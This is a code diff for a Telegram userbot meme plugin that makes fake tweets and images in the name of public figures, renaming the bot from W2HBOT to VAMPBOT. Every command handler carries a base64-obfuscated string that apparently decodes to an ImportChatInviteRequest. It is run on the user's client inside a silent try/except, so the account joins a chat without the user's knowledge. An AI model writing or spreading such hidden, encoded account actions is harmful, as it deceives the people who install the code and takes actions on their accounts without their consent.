@@ -5,7 +5,7 @@
 # mia, johhny, sunny, dani
 # modi, rahul, trump, gandhiji
 # no offence. Made for fun purpose only
-# Now in W2HBOT
+# Now in VAMPBOT
 
 from userbot import CMD_HELP
 from userbot.helpers.functions import (
@@ -21,21 +21,21 @@ from userbot.helpers.functions import (
     trumptweet,
     dani,
 )
-from W2HBOT.utils import admin_cmd, sudo_cmd, edit_or_reply
+from VAMPBOT.utils import admin_cmd, sudo_cmd, edit_or_reply
 from userbot.cmdhelp import CmdHelp
 
 
 @bot.on(admin_cmd(pattern=r"tweet(?: |$)(.*)"))
 @bot.on(sudo_cmd(pattern="tweet(?: |$)(.*)", allow_sudo=True))
 async def nope(aura):
-    W2H = aura.pattern_match.group(1)
-    if not W2H:
+    vamp = aura.pattern_match.group(1)
+    if not vamp:
         if aura.is_reply:
             (await aura.get_reply_message()).message
         else:
             await edit_or_reply(aura, "I need some text to make a tweet🚶")
             return
-    tweeter = await bot.inline_query("TwitterStatusBot", f"{(deEmojify(W2H))}")
+    tweeter = await bot.inline_query("TwitterStatusBot", f"{(deEmojify(vamp))}")
     await tweeter[0].click(
         aura.chat_id,
         reply_to=aura.reply_to_msg_id,
@@ -64,12 +64,12 @@ async def nekobot(borg):
             return
     await edit_or_reply(borg, "Requesting trump to tweet...")
     try:
-        W2H = str(
+        vamp = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await borg.client(W2H)
+        await borg.client(vamp)
     except:
         pass
     text = deEmojify(text)
@@ -97,12 +97,12 @@ async def nekobot(borg):
             return
     await edit_or_reply(borg, "Requesting modi to tweet...")
     try:
-        W2H = str(
+        vamp = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await borg.client(W2H)
+        await borg.client(vamp)
     except:
         pass
     text = deEmojify(text)
@@ -130,12 +130,12 @@ async def nekobot(borg):
             return
     await edit_or_reply(borg, "Requesting Mia to tweet...")
     try:
-        W2H = str(
+        vamp = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await borg.client(W2H)
+        await borg.client(vamp)
     except:
         pass
     text = deEmojify(text)
@@ -163,12 +163,12 @@ async def nekobot(borg):
             return
     await edit_or_reply(borg, "Requesting Dani to tweet...")
     try:
-        W2H = str(
+        vamp = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await borg.client(W2H)
+        await borg.client(vamp)
     except:
         pass
     text = deEmojify(text)
@@ -197,12 +197,12 @@ async def nekobot(borg):
             return
     await edit_or_reply(borg, "Requesting pappu to tweet...")
     try:
-        W2H = str(
+        vamp = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await borg.client(W2H)
+        await borg.client(vamp)
     except:
         pass
     text = deEmojify(text)
@@ -231,12 +231,12 @@ async def nekobot(borg):
             return
     await edit_or_reply(borg, "Requesting sunny to tweet...🥰")
     try:
-        W2H = str(
+        vamp = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await borg.client(W2H)
+        await borg.client(vamp)
     except:
         pass
     text = deEmojify(text)
@@ -265,12 +265,12 @@ async def nekobot(borg):
             return
     await edit_or_reply(borg, "Requesting johhny to tweet...😆")
     try:
-        W2H = str(
+        vamp = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await borg.client(W2H)
+        await borg.client(vamp)
     except:
         pass
     text = deEmojify(text)
@@ -298,12 +298,12 @@ async def nekobot(borg):
             return
     await edit_or_reply(borg, "Requesting baapu to tweet...")
     try:
-        W2H = str(
+        vamp = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await borg.client(W2H)
+        await borg.client(vamp)
     except:
         pass
     text = deEmojify(text)
@@ -332,12 +332,12 @@ async def nekobot(borg):
             return
     await edit_or_reply(borg, "Your banner is under creation wait a sec...")
     try:
-        W2H = str(
+        vamp = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await borg.client(W2H)
+        await borg.client(vamp)
     except:
         pass
     text = deEmojify(text)
@@ -366,12 +366,12 @@ async def nekobot(borg):
             return
     await edit_or_reply(borg, "Kanna is writing your text...")
     try:
-        W2H = str(
+        vamp = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await borg.client(W2H)
+        await borg.client(vamp)
     except:
         pass
     text = deEmojify(text)
